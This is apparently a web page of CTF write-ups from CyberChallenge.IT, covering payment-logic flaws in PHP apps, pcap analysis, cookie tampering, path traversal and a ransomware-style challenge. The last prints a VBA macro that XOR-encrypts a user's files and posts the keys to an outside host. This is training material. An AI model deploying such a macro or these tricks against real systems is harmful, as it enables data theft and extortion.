@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title> CyberChallenge | Jeopardy </title>
+    <link rel="shortcut icon" href="/img/favicon.ico" width="70">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <link rel="stylesheet" href="/fonts/fonts.css" >
+      <link rel="stylesheet" href="/res/bootstrap.min.css">
+      <link rel="stylesheet" href="/res/w3.css">
+      <link rel="stylesheet" href="/css/style.css">
+      <link rel="stylesheet" href="/css/personal_icon.css">
+      <link rel="stylesheet" href="/res/prism_themes/prism-base16-ateliersulphurpool.light.css">
+      <link rel="stylesheet" href="../ctf.css">
+      <link rel="stylesheet" href="../../css/sidebar.css">
+  </head>
+  <body>
+
+    <!-- Navbar -->
+    <div id="include_navbar"></div>
+
+    <!-- Return to Top -->
+    <a href="javascript:" id="return-to-top"><i class="fas fa-chevron-up"></i></a>
+
+    <!-- Sidebar Nav -->
+    <div id="include_sidebar"></div>
+
+    <!-- Main -->
+    <main>
+    <div class="swipe-area"></div>
+    <br><br><br>
+    <div class="container">
+      <article role="article">
+    		<h3> Jeopardy </h3>
+        <br>
+
+        <dl class="toc">
+          <h4> Table of Contents </h4>
+          <ol class="two-colums">
+            <li> <a href="#winrar-license"> AC_1.01-WinRAR License - Points: 500 </a></li>
+            <li> <a href="#evilCorp"> AC_1.02-E(vil) Corp - Points: 500 </a></li>
+            <li> <a href="#noobexfil"> NS_1.01-NoobExfil - Points: 500 </a></li>
+            <li> <a href="#cyberCapacitor"> NS_1.02-CyberCapacitor - Points: 500 </a></li>
+            <li> <a href="#baby2000"> WS_1.01-baby2000 - Points: 500 </a></li>
+            <li> <a href="#magicUpload"> WS_1.02-magicUpload - Points: 500 </a></li>
+            <li> <a href="#magicUpload"> WS_1.02-magicUpload - Points: 500 </a></li>
+
+          </ol>
+        </dl>
+        <hr style="margin-bottom: 3em; width: 30%; margin-left: 35%;">
+
+<!-- Start Post  -->
+        <dl class="anchor" id="evilCorp">
+          <dt> AC_1.02-E(vil) Corp - Points: 500 </dt>
+          <dd> The world is upside down. First the pandemic, then the protests in the USA, and now WinRAR is forcing us to pay a license! They want 300$, but we only have 100$ right now. But we need those sweet sweet .rar files... Please pay them somehow! <br>
+          <code>http://winrar.challs.cyberchallenge.it/</code>
+        </dl>
+
+        <dl>
+          Following the files inside the .zip file: <br><br>
+          <b>index.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+&lt;?php
+
+session_start();
+
+include 'includes/header.php';
+
+if (isset($_SESSION['you']) && isset($_SESSION['winrar'])) {
+	echo "&lt;div class='col-md-6'&rt;
+		&lt;p&rt;You currently have {$_SESSION['you']['amount']}$ in your account.&lt;/p&rt;
+		&lt;p&rt;You transferred a total of {$_SESSION['winrar']['amount']}$ to WinRAR.&lt;/p&rt;&lt;br/&rt;";
+	if ($_SESSION['winrar']['amount'] &rt;= 300) {
+		echo "&lt;code&rt;".getenv('FLAG')."&lt;/code&rt;";
+	}
+	echo "&lt;/div&rt;";
+
+	echo "&lt;div class='col-md-6'&rt;&lt;p&rt;Create a new payment&lt;/p&rt;
+		&lt;form action='authorize_payment.php' method='GET'&rt;
+			&lt;label for='amount' value='Amount'&rt;
+			&lt;input type='text' name='amount' placeholder='0'/&rt;
+			&lt;input type='submit' class='btn btn-primary'/&rt;
+		&lt;/form&rt;&lt;/div&rt;";
+} else {
+	echo "&lt;div class='col-md'&rt;You currently don't have an account&lt;/div&rt;";
+}
+
+echo "&lt;div class='col-md'&rt;Go &lt;a href='new_account.php'&rt;here&lt;/a&rt; if you want a new account.&lt;/div&rt;";
+
+include 'includes/footer.php';
+
+?&rt;
+          </code></pre>
+        </div>
+
+        <dl>
+          <br><b>new_account.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+&lt;?php
+
+session_start();
+
+header("Refresh:2; url=index.php");
+
+echo "Setting up an account for you and resetting your payments.&lt;br/&rt;";
+
+
+$_SESSION['you']['amount'] = 100;
+echo "You now have {$_SESSION['you']['amount']}$.&lt;br/&rt;";
+$_SESSION['winrar']['amount'] = 0;
+echo "Your friend now has {$_SESSION['winrar']['amount']}$.&lt;br/&rt;";
+
+$_SESSION['payments'] = array();
+
+echo "Redirecting to your home page...";
+          </code></pre>
+        </div>
+
+        <dl>
+          <br><b>authorize_payment.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+&lt;?php
+
+session_start();
+
+// The amount of money you currently have on your account
+$account = $_SESSION['you']['amount'];
+// The amount of money you want to pay
+$amount = (int)$_GET['amount'];
+if ($amount &lt; 0) { exit("No stealing plz"); }
+
+// Perform payment, but only if you have enough money for it
+if ($account - $amount >= 0) {
+	// Add payment to authorized payments
+	$id = bin2hex(random_bytes(10));
+	$_SESSION['payments'][$id] = $amount;
+	header("Refresh: 3;url=finalize_payment.php?id=$id");
+	echo "Payment authorized with ID $id.&lt;br/&rt;Processing payment authorization...";
+} else {
+	echo "Payment authorization failed. Not enough money.";
+}
+          </code></pre>
+        </div>
+
+        <dl>
+          <br><b>finalize_payment.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+&lt;?php
+
+session_start();
+
+// Get payment data
+$id = $_GET['id'];
+if (!array_key_exists($id, $_SESSION['payments'])) {
+    exit('Payment failed. Invalid payment ID');
+}
+
+$amount = (int)$_SESSION['payments'][$id];
+// Remove payment from authorized payments list
+unset($_SESSION['payments'][$id]);
+
+// Actual money transfer
+$_SESSION['you']['amount'] -= $amount;
+$_SESSION['winrar']['amount'] += $amount;
+
+echo "Payment successful. You paid $amount$.";
+          </code></pre>
+        </div>
+
+        <dl>
+          As the code suggest the first thing we have to do on the site is to register a new account which comes with 100$. The challenge ask us to find a way to pay 300$ for the WinRAR license.
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/01-ac-winrar-license_1.png')" >
+            <img src="img/jeopardy/01-ac-winrar-license_1.png" alt="" />
+          </figure>
+        </div>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/01-ac-winrar-license_2.png')" >
+            <img src="img/jeopardy/01-ac-winrar-license_2.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          The payment itself requires a valid ID to be completed. Since the payment phase is divide in two part and there is 5 second delay before one to the following one, we can simply copy and paste the ID the program generate and before the new page loads we can simply stop the browser request. Iterate this procedure a numbers of times needed to save up 300$, we can simply made a new request at <code>http://winrar.challs.cyberchallenge.it/finalize_payment.php?id=ID</code> and substitute each time the ID field with the IDs previously memorized and get the flag.
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/01-ac-winrar-license_3.png')" >
+            <img src="img/jeopardy/01-ac-winrar-license_3.png" alt="" />
+          </figure>
+        </div>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/01-ac-winrar-license_4.png')" >
+            <img src="img/jeopardy/01-ac-winrar-license_4.png" alt="" />
+          </figure>
+        </div>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{why_w0uld_s0m30n3_p4y_4_a_WinRAR_l1c3ns3} </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+<!-- Start Post  -->
+        <dl class="anchor" id="evilCorp">
+          <dt> AC_1.02-E(vil) Corp - Points: 500 </dt>
+          <dd> You payed E Corp 200$ for a service we never received. However, E Corp forced your bank to block all refunds for that payment. <br>
+            Get your money back any way you can! <br>
+            <code>http://evilcorp.challs.cyberchallenge.it/</code>
+        </dl>
+
+        <dl>
+          Following the files inside the .zip file: <br><br>
+          <b>index.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+ &lt;?php
+
+session_start();
+
+include 'includes/header.php';
+
+if (isset($_SESSION['you']) && isset($_SESSION['corp'])) {
+	echo " &lt;div class='col-md-6'>
+		 &lt;p>You currently have {$_SESSION['you']['amount']}$ in your account. &lt;/p>";
+	echo " &lt;p>You currently paid {$_SESSION['corp']['amount']}$. &lt;/p>";
+
+	if ($_SESSION['corp']['amount']  &lt;= 0) {
+		echo " &lt;code>".getenv('FLAG')." &lt;/code>";
+	}
+	echo " &lt;/div>";
+
+	echo " &lt;div class='col-md-6'> &lt;p>Create a new payment &lt;/p>
+		 &lt;form action='authorize_payment.php' method='GET'>
+			 &lt;label for='amount' value='Amount'>
+			 &lt;input type='text' name='amount'/>
+			 &lt;input type='submit' class='btn btn-primary'/>
+		 &lt;/form>";
+	echo " &lt;h1>Your payments &lt;/h1>
+		 &lt;table>";
+
+	echo " &lt;tr>";
+	echo " &lt;td>► 200$ &lt;/td>";
+	echo " &lt;td>(Refund unavailable) &lt;/td>";
+	echo " &lt;/tr>";
+
+	foreach ($_SESSION['payments'] as $id => $amount) {
+		echo " &lt;tr>";
+		echo " &lt;td>► $amount$ &lt;/td>";
+		echo " &lt;td> &lt;a href='refund_payment.php?id=$id'>Get refund &lt;/a> &lt;/td>";
+		echo " &lt;/tr>";
+	}
+	echo " &lt;/table> &lt;/div>";
+
+} else {
+	echo " &lt;div class='col-md-6'> &lt;p>You currently don't have an account &lt;/p>";
+}
+
+echo " &lt;p>Go  &lt;a href='new_account.php'>here &lt;/a> if you want a new account. &lt;p> &lt;/div>";
+
+include 'includes/footer.php';
+
+?>
+          </code></pre>
+        </div>
+
+        <dl>
+          <br><b>new_account.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+ &lt;?php
+
+session_start();
+
+header("Refresh:2; url=index.php");
+
+echo "Setting up an account and resetting your payments. &lt;br/>";
+
+$_SESSION['you']['amount'] = 100;
+echo "You now have {$_SESSION['you']['amount']}$. &lt;br/>";
+$_SESSION['corp']['amount'] = 200;
+echo "You currently payed {$_SESSION['corp']['amount']}$. &lt;br/>";
+
+$_SESSION['payments'] = array();
+
+echo "Redirecting to your home page...";
+          </code></pre>
+        </div>
+
+
+        <dl>
+          <br><b>authorize_payment.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+ &lt;?php
+
+session_start();
+
+// The amount of money you currently have on your account
+$account = $_SESSION['you']['amount'];
+// The amount of money you want to pay
+$amount = (int)$_GET['amount'];
+if ($amount  &lt; 0) { exit("No stealing plz"); }
+
+// Authorize payment, but only if you have enough money for it
+if ($account - $amount >= 0) {
+	array_unshift($_SESSION['payments'], $amount);
+	header("Refresh: 1;url=finalize_payment.php");
+	echo "Processing payment...";
+} else {
+	header("Refresh: 1; url=index.php");
+	echo "Payment failed. Not enough money.";
+}
+          </code></pre>
+        </div>
+
+        <dl>
+          <br><b>finalize_payment.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+ &lt;?php
+
+session_start();
+
+header("Refresh:2; url=index.php");
+
+$id = (int)$_GET['id'];
+
+// Get payment data
+if (!array_key_exists(0, $_SESSION['payments'])) {
+    exit('Payment failed. No payments to finalize.');
+}
+
+$amount = (int)$_SESSION['payments'][0];
+
+if ($_SESSION['you']['amount'] - $amount >= 0) {
+	// Actual money transfer
+	$_SESSION['you']['amount'] -= $amount;
+	$_SESSION['corp']['amount'] += $amount;
+
+	echo "Payment successful. You paid $amount$.";
+} else {
+	echo "Payment failed. You do not have $amount on your account.";
+}
+          </code></pre>
+        </div>
+
+        <dl>
+          <br><b>refund_payment.php</b>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+&lt;?php
+
+session_start();
+
+header("Refresh:2; url=index.php");
+
+$id = (int)$_GET['id'];
+
+// Get payment data
+if (!array_key_exists($id, $_SESSION['payments'])) {
+    exit('This payment is not available for refund');
+}
+
+$amount = (int)$_SESSION['payments'][$id];
+// Remove payment from authorized payments list
+unset($_SESSION['payments'][$id]);
+// (ignore this) rearrange array
+$_SESSION['payments'] = array_values($_SESSION['payments']);
+
+// Actual money transfer
+$_SESSION['you']['amount'] += $amount;
+$_SESSION['corp']['amount'] -= $amount;
+
+echo "Payment succesfully refunded. You received $amount$.";
+          </code></pre>
+        </div>
+
+        <dl>
+          Again as the code suggest the first thing we have to do on the site is to register a new account which comes with 100$. The challenge ask us to find a way to refund 200$ for a E-Corp service we never received.
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/02-ac-evilCorp_1.png')" >
+            <img src="img/jeopardy/02-ac-evilCorp_1.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          The challenge is very similiar to the previous one, in fact we just need to send a new payment request and stop it before the payment is finalized. Iterate this procedure a numbers of times needed to save up 200$
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/02-ac-evilCorp_2.png')" >
+            <img src="img/jeopardy/02-ac-evilCorp_2.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          Then we just need to get refund for each of our 'illegal' payment and the server give us the flag
+        </dl>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{4r3_y0u_r0b1n_h00d_0r_50m37h1ng?} </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+<!-- Start Post  -->
+        <dl class="anchor" id="noobexfil">
+          <dt> NS_1.01-NoobExfil - Points: 500 </dt>
+          <dd> I’ve just implemented a new method to exfiltrate data from a network stealthily. Can you see anything? <br>
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/01-ns-noobexfil_1.png')" >
+            <img src="img/jeopardy/01-ns-noobexfil_1.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          A file .pcapng is given to us. As the picture above shows, simply by analyzing the TCP we can found a .zip file containing the flag splitted in base64 chunck ordered by a number near by.
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-text">
+"1,UEsDBBQAAgAIANp",
+"2,8wlBRaanrIQAAAD",
+"3,0AAAAIABwAZmxhZ",
+"4,y50eHRVVAkAA2xW",
+"5,1l51VtZedXgLAAE",
+"6,E6AMAAAToAwAAc3",
+"7,b2DKkuyTAsjgeix",
+"8,Pgcg7x03ESZcVEl",
+"9,hOXm4+heywUAUEs",
+"10,BAh4DFAACAAgA2n",
+"11,zCUFFpqeshAAAAP",
+"12,QAAAAgAGAAAAAAA",
+"13,AQAAALSBAAAAAGZ",
+"14,sYWcudHh0VVQFAA",
+"15,NsVtZedXgLAAEE6",
+"16,AMAAAToAwAAUEsF",
+"17,BgAAAAABAAEATgA",
+"18,AAGMAAAAAAA=="
+          </code></pre>
+        </div>
+
+        <div class="row-full code">
+          <pre><code class="prism language-python">
+import base64
+
+list = [
+"1,UEsDBBQAAgAIANp",
+"2,8wlBRaanrIQAAAD",
+"3,0AAAAIABwAZmxhZ",
+"4,y50eHRVVAkAA2xW",
+"5,1l51VtZedXgLAAE",
+"6,E6AMAAAToAwAAc3",
+"7,b2DKkuyTAsjgeix",
+"8,Pgcg7x03ESZcVEl",
+"9,hOXm4+heywUAUEs",
+"10,BAh4DFAACAAgA2n",
+"11,zCUFFpqeshAAAAP",
+"12,QAAAAgAGAAAAAAA",
+"13,AQAAALSBAAAAAGZ",
+"14,sYWcudHh0VVQFAA",
+"15,NsVtZedXgLAAEE6",
+"16,AMAAAToAwAAUEsF",
+"17,BgAAAAABAAEATgA",
+"18,AAGMAAAAAAA=="]
+
+final = ''
+for s in list:
+	final += s.split(',')[1]
+
+print(final)
+str_decoded = base64.b64decode(final.encode())
+#print("{}".format(str_decoded))
+
+try:
+   with open("app.zip","wb+") as f:
+        f.write(str_decoded)
+
+except Exception as e:
+   print(str(e))
+          </code></pre>
+        </div>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{th1s_1s_a_l0ng_l0ng_l0ng_l0ng_l0ng_l0ng_v3ry_l0ng_FLAG} </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+<!-- Start Post  -->
+        <dl class="anchor" id="cyberCapacitor">
+          <dt> NS_1.02-CyberCapacitor - Points: 500 </dt>
+          <dd> I've always wondered what CyberCapacitor was. Certainly, their invoices are so dangerous! Our SOC analysed captured traffic, but they weren't able to understand what happened. Please help me! I have a lot of encrypted files and I can't recover my precious flag... <br> <br>
+        </dl>
+
+        <dl>
+          In the challenge description there is a .pcapng file. After analyzing the traffic file by following all the <i>HTTP stream</i> we see that there are a lot of encrypted file in the cache. Instead analyzing the <i>TCP stream</i> we are able to identify what happened: the user open a file attacched to an email which encrypted all the files in the computer. By downloading all the files from wireshark we can see a .zip protected by a password which contain a <b>.docx</b> possibly used to vehicle the attack. It would be possible to bruteforce it but, instead, we can try to use the string <code>2020_2020</code> showed in one of the image file downloaded and it is successfull. We also notice that there is a file called <b>flag_enc.txt</b> which needed a key to be restored.
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/02-ns-CyberCapacitor_1.png')" >
+            <img src="img/jeopardy/02-ns-CyberCapacitor_1.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          When the .docx file opens we are asked to accept the possibility to use the macros which suggest use we are looking in the right direction. In fact if we look at the macros we can see what the hacker really did to attack the user. In order to find the flag we need to look around all the encrypted files: as the <code>postString</code> suggest in the code, the cacheID encrypted string (which is stored for each file in a text file) first is base64 encoded, then the key value is concatenated to a file obfuscation function which simply convert: <br>
+          &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; a &rarr; 4 <br>
+          &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; e &rarr; 3 <br>
+          &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; l &rarr; 1 <br>
+          &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; g &rarr; 6 <br>
+          &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; . &rarr; $ <br>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-php">
+Rem Attribute VBA_ModuleType=VBADocumentModule
+Option VBASupport 1
+Private Function base64Encode(ByRef arrData() As Byte) As String
+    Dim xmlDoc As Object
+    Dim xmlNode As Object
+
+    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
+
+    Set xmlNode = xmlDoc.createElement("b64")
+
+    xmlNode.DataType = "bin.base64"
+    xmlNode.nodeTypedValue = arrData
+
+    base64Encode = xmlNode.Text
+End Function
+Private Sub oneTimePad(ByRef cleartext As String, ByRef key As String)
+    Dim l As Long
+    Dim lonLenK As Long, lonKPos As Long
+    lonLenK = Len(key)
+    For l = 1 To Len(cleartext)
+        lonKPos = lonKPos + 1
+        If lonKPos > lonLenK Then lonKPos = 1
+        Mid$(cleartext, l, 1) = Chr$(Asc(Mid$(cleartext, l, 1)) Xor Asc(Mid$(key, lonKPos, 1)))
+    Next l
+End Sub
+Private Function generateRNDKey(length As Integer, allowedChars As String) As String
+    j = ""
+
+    For i = 0 To (length - 1)
+        r = Int(59 * rnd)
+        If r > 0 Then
+            j = j & Mid(allowedChars, r, 1)
+        Else
+            j = j & "K"
+        End If
+    Next
+
+    generateRNDKey = j
+End Function
+Private Function leet(q As String) As String
+    q = Replace(q, "a", "4")
+    q = Replace(q, "e", "3")
+    q = Replace(q, "l", "1")
+    q = Replace(q, "g", "6")
+    leet = Replace(q, "t", "7")
+End Function
+Private Function obfuscateFileName(name As String) As String
+ Dim P As String
+
+ P = "$$" & name
+ obfuscateFileName = leet(Mid(P, 1, Len(name) + 2))
+End Function
+Private Sub G0T0()
+    Dim data As String, key As String, currentFileName As String
+    Dim fff As Object
+    Dim f As Object
+
+    Set oFSO = CreateObject("Scripting.FileSystemObject")
+
+    Set fff = oFSO.GetFolder(Environ$("USERPROFILE") & "\Documents\_private_")
+
+    For Each f In fff.Files
+        currentFileName = f.name
+
+        M = Environ$("USERPROFILE") & "\Documents\_private_\" & currentFileName
+
+        data = ""
+        key = ""
+
+        If Not Right(currentFileName, 4) = ".enc" Then
+            Open M For Input As #1
+             Do Until EOF(1)
+              Line Input #1, l
+              data = data & vbCrLf & l
+             Loop
+            Close #1
+
+            key = generateRNDKey(Len(data), _
+             "kLDbdFKvfWl8iMGAH17nNQsXTUmI6h3gOj4CaJ5ptRe2zPESBVY0o9rZucq")
+
+            oneTimePad data, key
+
+            Rem save encrypted file :P
+            Open M & ".enc" For Output As #1
+             Print #1, data
+            Close #1
+
+            Rem and delete it ;)
+            Rem Kill (M)
+
+            URL = "http://ptsv2.com/t/getCachedObject/post"
+
+            postString = _
+             "{ ""cacheID"": """ & _
+             base64Encode(StrConv(key & obfuscateFileName(Replace(currentFileName, ".", "$")), _
+             vbFromUnicode)) & """ }"
+
+            Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP")
+            xmlhttp.Open "POST", URL, False
+            xmlhttp.setRequestHeader "Content-Type", "application/json"
+            xmlhttp.send postString
+        End If
+    Next f
+End Sub
+Private Sub bottone_Click()
+ MsgBox ("no need tu run")
+ Rem G0T0
+End Sub
+Rem Private Sub Document_Open()
+Rem  G0T0
+Rem End Sub
+
+          </code></pre>
+        </div>
+
+        <dl>
+          By looking through the encrypted file we finally find one named flag. <br> <br>
+          <b>base64: </b> <i style="font-size: 0.35cm">ajZQVHV2NXBlNmNWVzVBWWVzZENGNTFkYWdqQiQkZjE0NiQ3eDc=</i> <br>
+          <b>obfuscated: </b> <i>j6PTuv5pe6cVW5AYesdCF51dagjB$$f146$7x7</i> <br>
+          <b>deobfusctaed: </b> <i>jgPTuv5pegcVW5AYesdCF5ldagjB..flag.txt</i> <br> <br>
+
+          Even if the key is random, we are able to recover it from the file name. Now, we just need to do the <code>XOR</code> operation between the content of the file <b>flag_enc.txt</b> and the key we just recovered to get our flag
+        </dl>
+
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{g1v3_m3_b4ck_my_fl4g} </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+<!-- Start Post  -->
+        <dl class="anchor" id="baby2000">
+          <dt> WS_1.01-baby2000 - Points: 500 </dt>
+          <dd> Log in as the admin user <br>
+              <code> http://baby2000.challs.cyberchallenge.it/ </code> <br>
+            <br>
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/01-ws-baby2000_1.png')" >
+            <img src="img/jeopardy/01-ws-baby2000_1.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          The first thing we notice here it's the login page. By inspecting the page we see that there is some available credentials (see image below) we can use to login.
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/01-ws-baby2000_2.png')" >
+            <img src="img/jeopardy/01-ws-baby2000_2.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          Once logged in, as the statement of the challenge suggest us, we can change the value of the user cookie to <b>admin</b> and refresh to get the flag.
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/01-ws-baby2000_3.png')" >
+            <img src="img/jeopardy/01-ws-baby2000_3.png" alt="" />
+          </figure>
+        </div>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{th3_c4tt1Est_log1n_form} </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+
+
+<!-- Start Post  -->
+        <dl class="anchor" id="magicUpload">
+          <dt> WS_1.02-magicUpload - Points: 500 </dt>
+          <dd> Nothing to say here. Retrieve the flag located in the file /flag <br>
+              <code> http://magicupload.challs.cyberchallenge.it/ </code> <br>
+            <br>
+        </dl>
+
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/02-ws-magicUpload_1.png')" >
+            <img src="img/jeopardy/02-ws-magicUpload_1.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          The first thing we can do here, after inspcting the site itself, it's browse and submit the image.
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/02-ws-magicUpload_2.png')" >
+            <img src="img/jeopardy/02-ws-magicUpload_2.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          Then we can create an Album (the name doesn't really matter) in the specific session and finally try to download it
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/02-ws-magicUpload_3.png')" >
+            <img src="img/jeopardy/02-ws-magicUpload_3.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          As we can see from the picture above, we can try to intercept the request and modify it, for example, using Burps. The path field in the dictionary contains the path of the image we uploaded and we chose during the album creation. We can try to modify that path by inserting, as the statement of the challenge suggest, the path <b>/flag</b> encoded as url instead of the image path itself. The image below show that we are able to read the flag after that.
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('\img/jeopardy/02-ws-magicUpload_4.png')" >
+            <img src="img/jeopardy/02-ws-magicUpload_4.png" alt="" />
+          </figure>
+        </div>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{ab177c085ada28c9eb534f9e7933f7f} </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+
+
+
+
+
+
+    	</article>
+
+      <section class="" role="group">
+        <button id="previous" onClick="location.href='network_security.html'" > Previous </button>
+        <button id="next"> Next </button>
+        <br> <br> <br>
+      </section>
+
+      </div>
+    </main>
+
+    <!-- Footer -->
+    <div id="include_footer"></div>
+
+
+    <script type="text/javascript" src="/fonts/fontawesome.js"></script>
+    <script type="text/javascript" src="/res/bootstrap.min.js"></script>
+    <script type="text/javascript" src="/res/jquery-3.4.1.js"></script>
+    <script type="text/javascript" src="/js/jquery.touchSwipe.min.js"></script>
+    <script type="text/javascript" src="/js/sidebar.js"> </script>
+    <script type="text/javascript" src="/js/return_to_top_arrow.js"></script>
+    <script type="text/javascript" src="/res/prism_themes/prism_lb.js"></script>
+    <script type="text/javascript" src="/js/img-zoom.js"></script>
+
+    <!-- Import HTML -->
+    <script>
+      // import navbar
+      $("#include_navbar").load("/html_import/navbar.html", function(){
+
+        // function to activate the hamburger menu
+        $('.menu-toggle').click(function(){
+          $('nav').toggleClass('active');
+        });
+      });
+
+      // import footer
+      $(function(){
+        $("#include_footer").load("/html_import/footer.html");
+      });
+
+      // import sidebar
+      $(function(){
+        $("#include_sidebar").load("../../html/sidebar.html");
+      });
+    </script>
+
+
+  </body>
+</html>
